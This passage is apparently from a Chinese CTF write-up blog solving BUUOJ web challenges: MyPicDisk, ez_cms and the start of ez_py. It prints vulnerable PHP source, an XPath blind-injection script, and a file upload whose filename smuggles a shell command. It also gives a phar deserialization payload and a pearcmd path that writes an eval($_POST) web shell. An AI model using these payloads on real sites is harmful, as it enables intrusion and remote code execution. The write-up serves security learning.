class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>这里还是有两种解法</strong></p><ul><li>phar文件上传</li><li>system命令拼接</li></ul><p>审计了一下代码  </p><p><strong>得出解题思路</strong></p><p>就是先进行登录   然后传文件</p><p><img src="../images/image-20230726111533509.png" alt="image-20230726111533509"></p><p>主要是得进到这个里面  然后就会实例化<code>FILE</code>这个类</p><p><img src="../images/image-20230726111628995.png" alt="image-20230726111628995"></p><p>这里的时候就会触发phar反序列化了</p><p><strong>另一个拼接命令的方法如下</strong></p><p><img src="../images/image-20230726111717191.png" alt="image-20230726111717191"></p><p>就是通过恶意构造文件名  来通过最后的命令执行</p><p>通过审计代码发现  其实登不登陆成功对做题影响都不大(<strong>不爆破出密码的话可以强制文件上传  都一样的</strong>)</p><p><img src="../images/image-20230726111926604.png" alt="image-20230726111926604"></p><p><img src="../images/image-20230726112001895.png" alt="image-20230726112001895"></p><p>这两个判断登录成功与否的方法并不会直接把代码给阻断掉  <code>echo</code>完后还会继续执行后面的代码</p><p>这里其实有个<strong>xml盲注</strong>的考点可以学习学习</p><p><img src="../images/image-20230726114448432.png" alt="image-20230726114448432"></p><p>这里可以使用<strong>xml盲注</strong>来注出密码的 (<strong>xpath注入</strong>)   ——&gt;  <strong>目的不只是为了做题</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment">#003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然后就可以把密码给爆破出来了</p><h3 id="system命令拼接"><a href="#system命令拼接" class="headerlink" title="system命令拼接"></a>system命令拼接</h3><p><img src="../images/image-20230726145115503.png" alt="image-20230726145115503"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 210</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=4ca196683169f8034a864930f1f86e84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功后</p><p><img src="../images/image-20230726145658481.png" alt="image-20230726145658481"></p><p>通过<code>get</code>传参       <strong><code>?file=上传的文件名字</code></strong></p><p><img src="../images/image-20230726145829047.png" alt="image-20230726145829047"></p><p>成功拿到flag名字  之后修改这个文件名就能拿到flag了</p><h3 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="phar文件上传"></a>phar文件上传</h3><p>先生成一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后上传图片  (<strong>修改后缀上传</strong>)</p><p><img src="../images/image-20230726153903059.png" alt="image-20230726153903059"></p><p>这里的话是<code>md5_file</code>来触发的</p><p><img src="../images/image-20230726153925874.png" alt="image-20230726153925874"></p><p>如果不填<code>todo=md5</code>的话  是不能触发的</p><p>(<strong>我也不知道为啥。。。。。。。。</strong>)</p><p><img src="../images/image-20230726162917937.png" alt="image-20230726162917937"></p><p><strong>按道理来说的话  在构造函数这里的时候已经触发这个<code>phar</code>了</strong></p><p><strong>解决了这个问题了</strong></p><p> 原因就是因为传进来的值会有<code>/</code>     然后就会进入正则  抛出异常</p><p><img src="../images/image-20230729003235802.png" alt="image-20230729003235802"></p><p>还是自己蠢了   tmd</p><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>这题真狗  </p><p>但是尝试<strong>pearcmd</strong>没写入成功(当时<code>pearcmd.php</code>位置错了 没发现)</p><p>然后尝试sql写入半天  还是没成功</p><p>最后又返回来用<code>pearcmd</code>写入才成功  (发现了位置不对后才成功)</p><p><a href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Y4—熊海CMS代码审计</a></p><p>看这篇文章就行了</p><p><img src="../images/image-20230726164436791.png" alt="image-20230726164436791"></p><p>就是这里</p><p><strong>如果访问默认的<code>pearcmd.php</code>路径的话   这个题目是访问不到的</strong></p><p><img src="../images/image-20230726171220938.png" alt="image-20230726171220938"></p><p>问下<code>gpt</code>之后  发现了<code>/usr/share/php</code>这个位置  尝试之后发现成功了</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?+config-create+/&amp;r=../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726172057819.png" alt="image-20230726172057819"></p><p>然后进行文件包含</p><p><img src="../images/image-20230726172316775.png" alt="image-20230726172316775"></p><p><strong>成功写入</strong></p><p>然后直接RCE就行了</p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>这道题是参考这个 <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88/README.md">hackergame2019</a>  出的题</p><p>这题考察得是<code>django</code>的<code>RCE</code></p><p><strong>拿到源码之后</strong></p><p>主要看里面的<code>settings.py</code>  这个文件</p><p><img src="../images/image-20230729154657238.png" alt="image-20230729154657238"></p><p><img src="../images/image-20230729154708124.png" alt="image-20230729154708124"></p><p>这里的话提供了<code>SECRET_KEY</code>   并且对<code>session</code>是进行<code>Pickle</code>反序列化解析的</p><p>通过这里的话我们就很清晰能得知可以通过伪造<code>session</code>来进行反序列化的</p><p><strong>并且在其官方文档里也提到了这个问题</strong></p><p><img src="../images/image-20230729154935067.png" alt="image-20230729154935067"></p><p><a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions</a></p><p>然后我们就去搜索这几个关键字  得到一篇文章  并且是有poc的</p><p><img src="../images/image-20230729155304243.png" alt="image-20230729155304243"></p><p>题目给我们的附件中  可以看到<code>django</code>的版本</p><p><img src="../images/image-20230729155402295.png" alt="image-20230729155402295"></p><p><img src="../images/image-20230729155428512.png" alt="image-20230729155428512"></p><p>其实默认采用的是<code>json</code>的序列化   但是为了出题  作者将其改为了<code>pickle</code>序列化</p><p><img src="../images/image-20230729155759379.png" alt="image-20230729155759379"></p><p>本来实际上是这样的  但是并不影响我们自己修改成Pickle</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 